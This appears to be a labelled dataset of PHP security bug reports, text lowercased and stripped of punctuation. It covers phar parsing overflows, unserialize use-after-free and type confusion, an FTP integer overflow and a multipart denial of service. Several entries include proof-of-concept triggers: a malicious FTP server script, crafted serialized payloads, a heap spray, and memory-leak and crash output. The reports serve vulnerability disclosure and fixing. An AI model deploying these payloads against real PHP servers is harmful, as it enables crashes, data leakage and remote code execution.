zip_cdir_new nentry error at root/php-5.6.6/ext/zip/lib/zip_dirent.c:120 120 zip_entry_init cd entry+i	11
move_uploaded_file allows nulls in path with newer versions of php we all taught nullbytes issues were over but there is still one simple bypass and i still have no clue why there is test script move_uploaded_file files x tmp_name tmp/test.php\x00.jpg that file will create what you think it should n't actual result i expect the fix of the next version to notice nullbytes and actually not ignore them this time thanks	11
buffer over-read in unserialize when parsing phar the nature of this vulnerability is cwe-126 buffer over-read it is possible to read beyond a buffer the vulnerability can be triggered when parsing a phar file at phar.c:623 if php_var_unserialize metadata p p buf_len var_hash tsrmls_cc buf_len is obtained from the phar file and passed into php_var_unserialize as the max argument under normal php_var_unserialize circumstances yycursor will always be max this however can be bypassed when processing a malform phar with a buf_len that is shorter then the string to be unserialized it should be noted that yycursor max should never happen due to lines like var_unserializer.c:893 if yylimit yycursor 2 yyfill 2 however since yyfill does nothing it is optimized away by the compiler and thus never called this is also a weakness in itself even though the vulnerable point is trigger via phar parsing thus by carefully crafting the string to be unserialize we can produce a condition where yycursor max when yycursor max a buffer over-read conditions occurs and the php_var_unserialize is in a unstable and vulnerable state for example var_unserializer.c:906 leads to an integer underflow or wrap around maxlen max yycursor i ve created a poc that triggers the buffer over-read condition resulting in a memory info leak this was done by unserializing a s len data string object using other serialized objects might lead to other possible attacks.i m still in the process of analysing those test script i ve created a poc that leaks chunks of memory ala heart-bleed style php poc.php mem leak found 0 00 00 00 4d 45 54 41 44 41 54 41 5f 31 32 33 34 metadata_1234 10 35 36 37 38 39 30 31 32 33 34 35 36 37 38 22 30 56789012345678 0 20 31 32 33 22 3b 0b 00 00 00 a5 61 13 55 0b 00 00 123 a.u 30 00 82 b7 29 4b b6 01 00 00 00 00 00 00 00 81 01 k 40 00 00 00 00 00 00 79 00 00 00 00 00 00 00 00 24 y 2ca0 d9 01 01 00 00 00 00 00 01 00 00 00 00 00 49 00 i 2cb0 00 00 00 00 00 00 59 00 00 00 00 00 00 00 48 c3 y h 2cc0 5c 02 01 00 00 00 08 09 0a 0b 0c 0d 0e 0f 10 11 2cd0 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 mem info leak found 11488 bytes leaked continuing to find more actual result backtrace from parsing the phar file to php_var_unserialize 0 in php_var_unserialize rval p max 77777 my_metadata b var_hash at home/elaw/php-5.6.7/ext/standard/var_unserializer.c:914 1 in phar_parse_metadata buffer metadata zip_metadata_len at home/elaw/php-5.6.7/ext/phar/phar.c:622 2 in phar_parse_pharfile fp fname home/elaw/php-5.6.6-afl-asan/sapi/cli/phar4-crash-0.phar fname_len alias alias_len halt_offset pphar compression error at home/elaw/php-5.6.7/ext/phar/phar.c:1038 3 in phar_open_from_fp fp fname home/elaw/php-5.6.6-afl-asan/sapi/cli/phar4-crash-0.phar fname_len alias alias_len options pphar is_data error at home/elaw/php-5.6.7/ext/phar/phar.c:1716 4 in phar_create_or_parse_filename fname home/elaw/php-5.6.6-afl-asan/sapi/cli/phar4-crash-0.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.7/ext/phar/phar.c:1346 5 in phar_open_or_create_filename fname phar4-crash-0.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.7/ext/phar/phar.c:1315 6 in zim_phar___construct ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.7/ext/phar/phar_object.c:1189	11
use after free vulnerability in unserialize static inline int object_common2 unserialize_parameter zend_long elements zval retval zval fname if z_type_p rval is_object return 0 todo resize before if process_nested_data unserialize_passthru z_objprop_p rval elements 1 return 0 zval_deref rval if z_objce_p rval php_ic_entry zend_hash_str_exists z_objce_p rval function_table wakeup sizeof wakeup 1 zval_stringl fname wakeup sizeof wakeup 1 bg serialize_lock call_user_function_ex cg function_table rval fname retval 0 0 1 null the wakeup magic method lead to this problem the simple code php class evilclass public name function wakeup unset this name fakezval pack iiii data unserialize a:2 i:0 o:9 evilclass 1 s:4 name a:2 i:0 i:1 i:1 i:2 i:1 r:4 for i 0 i 5 i v i fakezval i var_dump data the unset leads to the zval and all its children is freed from memory however the unserialize code will still allow to use r or r to set references to that already freed memory there is a use after free vulnerability and allows to execute arbitrary code	11
heap metadata corruption when parsing tar file in phar_tar_process_metadata this is a vulnerability whereby the heap header gets misaligned resulting in the corruption of the heap chunk s metadata a heap chunk is allocated in tar.c:167 metadata char safe_emalloc 1 entry uncompressed_filesize 1 a reference to this heap chunk is passed into phar_parse_metadata at tar.c:176 if phar_parse_metadata metadata entry metadata entry uncompressed_filesize tsrmls_cc failure the following gets called within phar_parse_metadata:611 when zip_metadata_len==0 phar_get_32 buffer buf_len this moves the pointer referencing the heap chunk by 4bytes when the heap chunk gets freeed at at tar.c:177 efree metadata the heap chunk is now misaligned by 4 bytes in otherwords zend_mm_header_of metadata info._size is now zend_mm_header_of metadata info._prev and zend_mm_header_of metadata info._prev is tained with the body s data possible means of exploitation vulnerable heap unlinking use after free due to freeing more memory then the real size of chunk test script i ve a poc that demonstrate the vulnerable path php heap_metadata_corruption.php segmentation fault 11 actual result initial allocation of metadata gdb-peda p metadata 1 after phar_parse_metadata gdb-peda p metadata 2 notice the mis-alignment by 4 bytes 0 phar_tar_process_metadata entry fp at home/elaw/php-5.6.8rc1/ext/phar/tar.c:178 1 in phar_parse_tarfile fp fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/temp/pharbztar1.000017.phar fname_len alias alias_len pphar is_data compression error at home/elaw/php-5.6.8rc1/ext/phar/tar.c:500 2 in phar_open_from_fp fp fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/temp/pharbztar1.000017.phar fname_len alias alias_len options pphar is_data error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1709 3 in phar_create_or_parse_filename fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/temp/pharbztar1.000017.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1346 4 in phar_open_or_create_filename fname temp/pharbztar1.000017.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1315 5 in zim_phar___construct ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.8rc1/ext/phar/phar_object.c:1189 0 phar_tar_process_metadata entry fp at home/elaw/php-5.6.8rc1/ext/phar/tar.c:178 1 in phar_parse_tarfile fp fname home/elaw/php-5.6.7/sapi/cli/poc.phar fname_len alias alias_len pphar is_data compression error at home/elaw/php-5.6.8rc1/ext/phar/tar.c:500 2 in phar_open_from_fp fp fname home/elaw/php-5.6.7/sapi/cli/poc.phar fname_len alias alias_len options pphar is_data error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1709 3 in phar_create_or_parse_filename fname home/elaw/php-5.6.7/sapi/cli/poc.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1346 4 in phar_open_or_create_filename fname temp/pharbztar1.000017.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1315 5 in zim_phar___construct ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.8rc1/ext/phar/phar_object.c:1189	11
buffer over flow when parsing tar/zip/phar in phar_set_inode there is a buffer over flow vulnerability when parsing tar/zip/phar via the phar phardata class the vulnerability is in phar_set_inode phar_internal.h:535 a buffer is allocated at phar_internal.h:536 char tmp maxpathlen on my 64bits ubuntu maxpathlen the vulnerability is triggered further down phar_internal.h:540 tmp_len entry filename_len entry phar fname_len memcpy tmp entry phar fname entry phar fname_len memcpy tmp entry phar fname_len entry filename entry filename_len there is no validation that tmp_len is smaller then maxpathlen both entry filename_len entry phar fname_len are obtained directly from the file and thus controllable by an attacker this results in a buffer-over-flow vulnerability in the subsequent memcopy there are multiple pathways to trigger this vulnerable point parsing tar file pharsing phar file pharsing zip file test script i ve created both a tar and zip archive that triggers this vulnerability test environment x64 ubuntu configure enable-zip enable-debug actual result breakpoint 1 phar_set_inode entry at home/elaw/php-5.6.8rc1/ext/phar/phar_internal.h:540 540 tmp_len entry filename_len entry phar fname_len gdb-peda p sizeof tmp 1 gdb-peda p tmp_len 2 gdb-peda bt 0 phar_set_inode entry at home/elaw/php-5.6.8rc1/ext/phar/phar_internal.h:541 1 in phar_parse_zipfile fp fname home/elaw/php-5.6.8rc1/sapi/cli/poc_bof.phar fname_len alias alias_len pphar error at home/elaw/php-5.6.8rc1/ext/phar/zip.c:638 2 in phar_open_from_fp fp fname home/elaw/php-5.6.8rc1/sapi/cli/poc_bof.phar fname_len alias alias_len options pphar is_data error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1703 3 in phar_create_or_parse_filename fname home/elaw/php-5.6.8rc1/sapi/cli/poc_bof.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1346 4 in phar_open_or_create_filename fname poc_bof.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1315 5 in zim_phar___construct ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.8rc1/ext/phar/phar_object.c:1189 6 in zend_do_fcall_common_helper_spec execute_data at home/elaw/php-5.6.8rc1/zend/zend_vm_execute.h:558 7 in zend_do_fcall_by_name_spec_handler execute_data at home/elaw/php-5.6.8rc1/zend/zend_vm_execute.h:693 8 in execute_ex execute_data at home/elaw/php-5.6.8rc1/zend/zend_vm_execute.h:363 9 in zend_execute op_array at home/elaw/php-5.6.8rc1/zend/zend_vm_execute.h:388 10 in zend_execute_scripts type retval file_count at home/elaw/php-5.6.8rc1/zend/zend.c:1341 11 in php_execute_script primary_file at home/elaw/php-5.6.8rc1/main/main.c:2597 12 in do_cli argc argv at home/elaw/php-5.6.8rc1/sapi/cli/php_cli.c:994 13 in main argc argv at home/elaw/php-5.6.8rc1/sapi/cli/php_cli.c:1378 14 in libc_start_main main main argc argv init optimized out fini optimized out rtld_fini optimized out stack_end at libc-start.c:287 15 in start stopped reason sigsegv in gdb-peda p rip 1 void	11
potential remote code execution with apache 2.4 apache2handler dear php security folks now think that it has the potential of resulting in remote code execution at the machine code level not php code level the issue is with apache 2.4 the php apache2handler sapi and pipelined http requests given a simple just a single echo php script netcat localhost 80 this is because after the first request the interpreter is deinitialized sapi_apache2.c line 679 calls php_apache_request_dtor but contrary to the situation under apache 2.2 apache 2.4 does not call the pool cleanup function php_server_context_cleanup before the second request is processed resulting in sg server_context still being non-null which then makes the second request being handled as a subrequest parent_req null skipping the call to php_apache_request_ctor thus running the request in a deconfigured interpreter sometimes this leads to segv sometimes it does not which makes me fear this has the potential for rce i m not a security researcher just a lowly sysadmin so i will not investigate exploitation potential further	9
memory corruption in phar_parse_tarfile when entry filename starts with null this is a single byte memory corruption vulnerability it is triggered when a tar entry filename starts with a null byte at tar.c:430 entry.filename_len will be set to zero if hdr name i 0 break entry.filename_len i this will result in an underflow in the array index at tar.437 if entry.filename entry.filename_len 1 entry.filename entry.filename_len 1 0 entry.filename_len since entry.filename is pointing to a heap chunk zend_mm_block on a x86 machine it has the potential to corrupt the heap chunk metadata on x64 machine it has the potential to corrupt 1 byte at the offset entry.filename test script poc here php poc_filename_nullbyte_crash.php segmentation fault actual result gdb-peda frame 0 phar_parse_tarfile fp fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/wip_poc__null_byte_filename.tar.phar fname_len alias alias_len pphar is_data compression error at home/elaw/php-5.6.8rc1/ext/phar/tar.c:437 437 if entry.filename entry.filename_len 1 gdb-peda p entry.filename_len 2 gdb-peda p entry.filename_len 1 3 integer underflow gdb-peda bt 0 phar_parse_tarfile fp fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/wip_poc__null_byte_filename.tar.phar fname_len alias alias_len pphar is_data compression error at home/elaw/php-5.6.8rc1/ext/phar/tar.c:437 1 in phar_open_from_fp fp fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/wip_poc__null_byte_filename.tar.phar fname_len alias alias_len options pphar is_data error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1709 2 in phar_create_or_parse_filename fname home/elaw/php-5.6.7/sapi/cli/phar_tar_gz_fuzzing/wip_poc__null_byte_filename.tar.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1346 3 in phar_open_or_create_tar fname wip_poc__null_byte_filename.tar.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/tar.c:130 4 in phar_open_or_create_filename fname wip_poc__null_byte_filename.tar.phar fname_len alias alias_len is_data options pphar error at home/elaw/php-5.6.8rc1/ext/phar/phar.c:1312 5 in zim_phar___construct ht return_value return_value_ptr this_ptr return_value_used at home/elaw/php-5.6.8rc1/ext/phar/phar_object.c:1189	11
integer overflow in ftp_genlist resulting in heap overflow the ftp_genlist function of the ftp extension is prone to an integer overflow which may result in remote code execution ext/ftp/ftp.c ftp_genlist 1826 size 0 1827 lines 0 1828 lastch 0 1829 while rcvd my_recv ftp data fd data buf ftp_bufsize 1830 if rcvd 1 1831 goto bail 1832 1833 1834 php_stream_write tmpstream data buf rcvd 1835 1836 size rcvd 1837 for ptr data buf rcvd rcvd ptr 1838 if ptr n lastch r 1839 lines 0 1840 else 1841 size 1 1842 1843 lastch ptr 1844 1845 in the above loop size or lines may overflow at 0 respectively 1 this requires sending more than 2^32 bytes which will be stored in a tempfile 1851 ret safe_emalloc lines 1 sizeof char size 2 1852 1853 entry ret 1854 text char ret lines 1 1855 entry text 1856 lastch 0 1857 while ch php_stream_getc tmpstream eof 1858 if ch n lastch r 1859 text 1 0 1860 entry text 1861 else 1862 text ch 3 1863 1864 lastch ch 1865 1866 entry null this results in the allocated buffer at 2 being to small to hold the data written to the tempfile which results in a heap overflow at 3 when loading the contents of the tempfile back into memory these kind of bugs are well-known to be exploitable and since php_stream_getc uses structs located on the heap which may be overwritten i think that this bug can be leveraged to attain remote code execution regards max spelsberg malicious_server.py usr/bin/env python2 coding utf-8 based on import os socket threading time allow_delete false local_ip localhost local_port 8887 currdir=os.path.abspath class ftpserverthread threading.thread def init self conn addr self.conn=conn self.addr=addr self.basewd=currdir self.cwd=self.basewd self.rest=false self.pasv_mode=false threading.thread.__init self def run self self.conn.send 220 welcome r\n while true cmd=self.conn.recv 256 if not cmd break else print recieved cmd try func=getattr self cmd 4 strip upper func cmd except exception e print error e traceback.print_exc self.conn.send 500 sorry.\r\n self.conn.close def type self cmd self.mode=cmd 5 self.conn.send 200 binary mode.\r\n def pasv self cmd from self.pasv_mode true self.servsock socket.socket socket.af_inet socket.sock_stream self.servsock.bind local_ip,0 self.servsock.listen 1 ip port self.servsock.getsockname print open ip port self.conn.send 227 entering passive mode s u u r\n join ip.split port 8 port def start_datasock self if self.pasv_mode self.datasock addr self.servsock.accept print connect addr else self.datasock=socket.socket socket.af_inet socket.sock_stream self.datasock.connect self.dataaddr self.dataport def stop_datasock self self.datasock.close if self.pasv_mode self.servsock.close this is the interesting part def list self cmd self.conn.send 150 here comes the directory listing.\r\n print list self.cwd self.start_datasock send 2^32 1 bytes of data for i in xrange 262144 if i 10000 0 print d i self.datasock.send b 16384 self.datasock.send a\r\n self.stop_datasock self.conn.send 226 directory send ok.\r\n class ftpserver threading.thread def init self self.sock socket.socket socket.af_inet socket.sock_stream self.sock.bind local_ip local_port threading.thread.__init self def run self self.sock.listen 5 while true th=ftpserverthread self.sock.accept th.daemon=true th.start def stop self self.sock.close if name__=='__main ftp=ftpserver ftp.daemon=true ftp.start print on local_ip local_port raw_input enter to end n ftp.stop buggy.php php id ftp_connect localhost 8887 ftp_pasv id true var_dump ftp_rawlist id result lldb r buggy.php process 54712 launched usr/bin/php x86_64 process 54712 stopped thread 1 tid libsystem_platform.dylib platform_memmove variant unknown 182 queue com.apple.main-thread stop reason exc_bad_access code=1 address frame 0 libsystem_platform.dylib platform_memmove variant unknown 182 libsystem_platform.dylib platform_memmove variant unknown 182 movb rsi r8 cl 186 movb cl rdi r8 190 subq rdx 194 je 216 lldb register read rsi rsi lldb bt thread 1 tid libsystem_platform.dylib platform_memmove variant unknown 182 queue com.apple.main-thread stop reason exc_bad_access code=1 address frame 0 libsystem_platform.dylib platform_memmove variant unknown 182 frame 1 php php_stream_read 81 frame 2 php php_stream_getc 22 frame 3 php lldb_unnamed_function2574 php 614 frame 4 php lldb_unnamed_function2530 php 118 frame 5 php lldb_unnamed_function9391 php 1752 frame 6 php execute_ex 79 frame 7 php zend_execute_scripts 482 frame 8 php php_execute_script 684 frame 9 php lldb_unnamed_function9505 php 4653 frame 10 php lldb_unnamed_function9503 php 1408 frame 11 libdyld.dylib start 1 lldb note that the first three bytes 42 43 de of rsi have been overwritten	11
php multipart/form-data remote dos vulnerability php multipart/form-data remote dos vulnerability author shusheng liu the department of security cloud baidu china 1 description php is vulnerable to a remote denial of service caused by repeatedly allocate memory銆乧oncatenate string銆乧opy string and free memory when php parses header areas of body part of http request with multipart/form-data by sending multiple http multipart requests to an affected application containing malicious header area of body part a remote attacker could exploit this vulnerability to cause the consumption of cpu resources 2 analysis 2.1 entry-point of the remote denial of service vulnerability the vulnerable function is multipart_buffer_headers that is called internally by the function sapi_post_handler_func in main/rfc1867.c sapi_post_handler_func is the entry-point function which parses body parts of http request with multipart/form-data there is a remote denial of service vulnerability when multipart_buffer_headers is called the source code of the multipart_buffer_headers function is shown as follows parse headers static int multipart_buffer_headers multipart_buffer self zend_llist header tsrmls_dc char line mime_header_entry prev_entry 0 entry int prev_len cur_len did n't find boundary abort if find_boundary self self boundary tsrmls_cc return 0 get lines of text or crlf_crlf while line get_line self tsrmls_cc line 0 0 add header to table char key line char value null if php_rfc1867_encoding_translation tsrmls_c self input_encoding zend_multibyte_encoding_detector line strlen line self detect_order self detect_order_size tsrmls_cc space in the beginning means same header if isspace line 0 value strchr line if value value 0 do value while isspace value entry.value estrdup value entry.key estrdup key else if zend_llist_count header if no on the line add to previous line prev_len strlen prev_entry.value cur_len strlen line entry.value emalloc prev_len cur_len 1 memcpy entry.value prev_entry.value prev_len memcpy entry.value prev_len line cur_len entry.value cur_len prev_len 0 entry.key estrdup prev_entry.key zend_llist_remove_tail header else continue zend_llist_add_element header entry prev_entry entry return 1 2.2 analyze the vulnerable function now we detailedly analyze logic of multipart_buffer_headers and then we prove denial of service vulnerability of multipart_buffer_headers step 1 the multipart_buffer_headers executes while loop cycle to parse current body part headers if the boundary string was found while line get_line self tsrmls_cc line 0 0 step 2 step 2.1 when parseing current body part headers which is represented as header value the multipart_buffer_headers function firstly call get_line function to read a line of characters but get_line return a line when it meets character n not r\n after getting a line which is stored in the variable line the multipart_buffer_headers function parses the variable line step 2.2 if the first character of the line is blank character corresponding code if isspace line 0 or the variable line contains character the multipart_buffer_headers function successfully parse a header pair that is represented as entry header value and then it calls zend_llist_add_element function to store entry and use variable prev_entry to record lastest parsed name value pair entry after that it go to next cycle step 2.3 in this step the multipart_buffer_headers function thinks current line is not a new header and current line should be append to value of prev_entry thus prev_entry and current line merge into a new entry by executing the following codes prev_len strlen prev_entry.value cur_len strlen line entry.value emalloc prev_len cur_len 1 allocate prev_len cur_len bytes memory memcpy entry.value prev_entry.value prev_len copy prev_len bytes memcpy entry.value prev_len line cur_len cope prev_len cur_len bytes memory entry.value cur_len prev_len 0 entry.key estrdup prev_entry.key zend_llist_remove_tail header free memory 2.3 the remote denial of service vulnerability if value of body part header consists of n lines and first character of each line is not blank character and each line did constains character the multipart_buffer_headers function executes step 2.3 n-1 times when the multipart_buffer_headers function parse the header the block of code allocates memory once executes string copy operation twice frees memory once each time mergence of entry.value increase length of body part header s value thus string copy operations will cause the consumption of cpu resources and then the service is not available if n is the length of body part header s value and copying one byte is the unit time complexity锛宼he time complexity of multipart_buffer_headers function is o n m for example锛 webkitformboundarype33tmsnwwsmphqz content-disposition form-data name file filename s a a a a content-type application/octet-stream php phpinfo webkitformboundarype33tmsnwwsmphqz the value of content-disposition consists of 5 lines and the length of the value of content-disposition is 5 the multipart_buffer_headers function executes step 2.3 4 times the first time execution copys 2 bytes the second execution copys 3 bytes the third time execution copys 4 bytes the fourth time execution copys 5 bytes thus the multipart_buffer_headers function executes 14 times byte copy operation default maximum size of body part is 2097152 bytes 2m it is enough to cause the consumption of cpu resources by sending multiple http multipart requests to an affected application containing malicious header area of body part test script the poc was sent to the email security php.net by liushusheng baidu.com expected result poc prints response time of a dos-attack request銆俽esponse time of the dos-attack request more than 5 seconds	11
cve-2006-7243 fix regressions in 5.4 tested on 5.5.23 quick look at git 5.6 branch suggests 5.6 should be affected similarly not sure if this can use 5.4-like fix using zend_parse_parameters p format or needs 5.3-like fix with dir is checked to be path and not contain php warning tempnam expects parameter 1 to be a valid path string given in command line code on line 1 null	6
pcntl_exec should not allow null char pcnt_exec does not check path validity it should not allow null char just like other file related functions i think exec should not allow null char too i ll prepare the patch any comments	9
soapclient s call type confusion through unserialize soapclient s call method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize calls in soap.c:2906 if zend_hash_find z_objprop_p this_ptr default_headers sizeof default_headers void tmp success hashtable default_headers z_arrval_p tmp the z_arrval_p macro is called on default_headers assuming that it is an array without any actual check about it it has been shown several times that this kind of vulnerability could lead to crash arbitrary read/write memory access and code execution so i m not discussing about the actual exploitation of this one you can refer to my previous submissions about natsort and extract if needed by the way however it s worth pointing out that given the nature of call magic method any direct call on a user-controlled userialized input should be considered remotely exploitable test script php tested on 64bit ubuntu php 5.6.6 crash on memory access violation 1337 dummy unserialize o:10 soapclient 3 s:3 uri s:1 a s:8 location s:22 s:17 default_headers i:1337 var_dump dummy whatever actual result gdb r soapvar.php starting program usr/bin/php soapvar.php thread debugging using libthread_db enabled using host libthread_db library lib/x86_64-linux-gnu/libthread_db.so.1 new thread lwp 13984 thread lwp 13984 exited program received signal sigsegv segmentation fault zend_hash_internal_pointer_reset_ex ht=ht entry pos=pos entry at build/buildd/php5-5.6.3+dfsg/zend/zend_hash.c:1020 1020 pos ht plisthead gdb x/i pc zend_hash_internal_pointer_reset_ex+3 mov rdi rax gdb p rdi 1 1337	11
soapclient s call type confusion through unserialize method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize calls assuming that it is an array without any actual check about it it has been shown several times that this kind of vulnerability could lead to crash arbitrary read/write memory access and code execution so i m not discussing about the actual exploitation of this one you can refer to my previous submissions about natsort and extract if needed by the way however it s worth pointing out that given the nature of call magic method any direct call on a user-controlled userialized input should be considered remotely exploitable	9
buffer overflow and stack smashing error in phar_fix_filepath first of all i apologize in advance for not upgrading and testing with the most recent vanilla version of php i really think the bug likely exists in the most recent version and that i m not wasting your time i can raise this with redhat if i must version latest posted for centos 7 greezybacon x php version php 5.4.16 cli built jun 23 2015 21:17:27 copyright c 1997-2013 the php group zend engine v2.4.0 copyright c 1998-2013 zend technologies with xdebug v2.2.7 copyright c 2002-2015 by derick rethans greezybacon x rpm qa|grep php php-imap-5.4.16-3.el7.x86_64 php-gd-5.4.16-36.el7_1.x86_64 php-devel-5.4.16-36.el7_1.x86_64 php-pecl-xdebug-2.2.7-1.el7.x86_64 php-pdo-5.4.16-36.el7_1.x86_64 php-5.4.16-36.el7_1.x86_64 php-process-5.4.16-36.el7_1.x86_64 php-pear-1.9.4-21.el7.noarch php-common-5.4.16-36.el7_1.x86_64 php-cli-5.4.16-36.el7_1.x86_64 php-mysql-5.4.16-36.el7_1.x86_64 php-xml-5.4.16-36.el7_1.x86_64 php-mbstring-5.4.16-36.el7_1.x86_64 php-intl-5.4.16-36.el7_1.x86_64 backtraces immediately before stack smash is triggered breakpoint 1 in phar_fix_filepath from usr/lib64/php/modules/phar.so gdb bt 0 in phar_fix_filepath from usr/lib64/php/modules/phar.so 1 in phar_split_fname from usr/lib64/php/modules/phar.so 2 in phar_parse_url from usr/lib64/php/modules/phar.so 3 in phar_wrapper_stat from usr/lib64/php/modules/phar.so 4 in php_stream_stat_path 5 in php_stat.part.3 6 in zif_is_file 7 in phar_is_file from usr/lib64/php/modules/phar.so 8 in xdebug_execute_internal from usr/lib64/php/modules/xdebug.so 9 in zend_do_fcall_common_helper_spec 10 in execute 11 in xdebug_execute from usr/lib64/php/modules/xdebug.so 12 in zend_do_fcall_common_helper_spec 13 in execute 14 in xdebug_execute from usr/lib64/php/modules/xdebug.so 15 in zend_call_function 16 in zend_call_method 17 in zif_spl_autoload_call 18 in zend_call_function 19 in zend_lookup_class_ex 20 in zend_is_callable_check_class 21 in zend_is_callable_check_func.isra.13 22 in zend_is_callable_ex 23 in zif_is_callable 24 in xdebug_execute_internal from usr/lib64/php/modules/xdebug.so 25 in zend_do_fcall_common_helper_spec 26 in execute 27 in xdebug_execute from usr/lib64/php/modules/xdebug.so 28 in zend_do_fcall_common_helper_spec 29 in execute 30 in xdebug_execute from usr/lib64/php/modules/xdebug.so 31 in zend_do_fcall_common_helper_spec 32 in execute 33 in xdebug_execute from usr/lib64/php/modules/xdebug.so 34 in zend_do_fcall_common_helper_spec 35 in execute 36 in xdebug_execute from usr/lib64/php/modules/xdebug.so 37 in zend_do_fcall_common_helper_spec 38 in execute 39 in xdebug_execute from usr/lib64/php/modules/xdebug.so 40 in zend_do_fcall_common_helper_spec 41 in execute 42 in xdebug_execute from usr/lib64/php/modules/xdebug.so 43 in zend_do_fcall_common_helper_spec 44 in execute 45 in xdebug_execute from usr/lib64/php/modules/xdebug.so 46 in zend_do_fcall_common_helper_spec 47 in execute 48 in xdebug_execute from usr/lib64/php/modules/xdebug.so 49 in zend_do_fcall_common_helper_spec 50 in execute 51 in xdebug_execute from usr/lib64/php/modules/xdebug.so 52 in zend_do_fcall_common_helper_spec 53 in execute 54 in xdebug_execute from usr/lib64/php/modules/xdebug.so 55 in zend_execute_scripts 56 in php_execute_script 57 in do_cli 58 in main immediately following the crash gdb bt 0 in from lib64/libgcc_s.so.1 1 in unwind_backtrace from lib64/libgcc_s.so.1 2 in backtrace from lib64/libc.so.6 3 in libc_message from lib64/libc.so.6 4 in fortify_fail from lib64/libc.so.6 5 in stack_chk_fail from lib64/libc.so.6 6 in phar_fix_filepath from usr/lib64/php/modules/phar.so 7 in 8 in 9 in 10 in 11 in 12 in 13 in 14 in the script which is osticket v1.10 osticket.com and github.com/osticket/osticket-1.8 is processing an email using the imap php extension and processing a plain text php attachment the bytes 0a20202020202a0a seem to occur in the attachment starting at byte offset 00001000 6f 66 20 74 68 65 20 6d 65 73 73 61 67 65 20 62 of the message b 00001010 6f 64 79 2c 20 69 6e 63 6c 75 64 69 6e 67 20 61 ody including a 00001020 6e 79 0a 20 20 20 20 20 2a 20 20 20 20 20 20 20 ny 00001030 20 20 20 20 20 20 20 20 4d 69 6d 65 20 70 61 72 mime par 00001040 74 73 2c 20 65 74 63 2e 0a 20 20 20 20 20 2a 0a ts etc 00001050 20 20 20 20 20 2a 20 40 72 65 74 75 72 6e 20 6d return m 00001060 69 78 65 64 20 52 65 74 75 72 6e 73 20 74 72 75 ixed returns tru 00001070 65 20 6f 6e 20 73 75 63 63 65 73 73 2c 20 6f 72 e on success or 00001080 20 61 20 50 45 41 52 5f 45 72 72 6f 72 0a 20 20 a pear_error 00001090 20 20 20 2a 20 20 20 20 20 20 20 20 20 20 20 20 000010a0 20 20 20 63 6f 6e 74 61 69 6e 69 6e 67 20 61 20 containing a 000010b0 64 65 73 63 72 69 70 74 69 76 65 20 65 72 72 6f descriptive erro 000010c0 72 20 6d 65 73 73 61 67 65 20 6f 6e 0a 20 20 20 r message on 000010d0 20 20 2a 20 20 20 20 20 20 20 20 20 20 20 20 20 000010e0 20 20 66 61 69 6c 75 72 65 2e 0a 20 20 20 20 20 failure my initial inspection of phar.c source at l2153 is that it appears there is no check if newpath_len will exceed maxpathlen which is the size of newpath on the stack i will likely not be able to produce a script to trigger this as it appears that it is triggered from fetching this particular email via imap but if necessary i can try php.ini changes we do n't have anything serious changed in the ini file beyond short_open_tag max_execution_time and upload_max_filesize if there s something of interest i can post it	11
str_ireplace/php_string_tolower arbitrary code execution hello i discovered a vulnerability issue in this php version php version php 7.0.0-dev cli built jul 25 2015 11:31:46 debug copyright c 1997-2015 the php group zend engine v3.0.0-dev copyright c 1998-2015 zend technologies in this new version of php it is possible to control some registers and this could be lead to an arbitrary code execution the problem is in the function str_ireplace the third arguments subject type is not checked because of that we can control the assembly registers we can check that in gdb breakpoint 1 in php_string_tolower s at home/df0/php-src/ext/standard/string.c:1503 1503 e c zstr_len s gdb x/10i rip php_string_tolower+29 mov rdx qword ptr rax php_string_tolower+33 mov rax qword ptr rbp php_string_tolower+37 add rax rdx php_string_tolower+40 mov qword ptr rbp rax php_string_tolower+44 jmp php_string_tolower+272 php_string_tolower+49 call ctype_b_loc plt php_string_tolower+54 mov rdx qword ptr rax php_string_tolower+57 mov rax qword ptr rbp php_string_tolower+61 movzx eax byte ptr rax php_string_tolower+64 movzx eax al gdb x/10x rax gdb ni 1503 e c zstr_len s gdb x/x rdx can not access memory at address if you have a question do not hesitate regards dimitri fourny test script php heap spray ini_set memory_limit 1 part str_repeat x41 4096 str str_repeat part 10 1024 1024 256/4096 the core a string str_ireplace a a actual result program received signal sigsegv segmentation fault in php_string_tolower s at php-src/ext/standard/string.c:1503	11
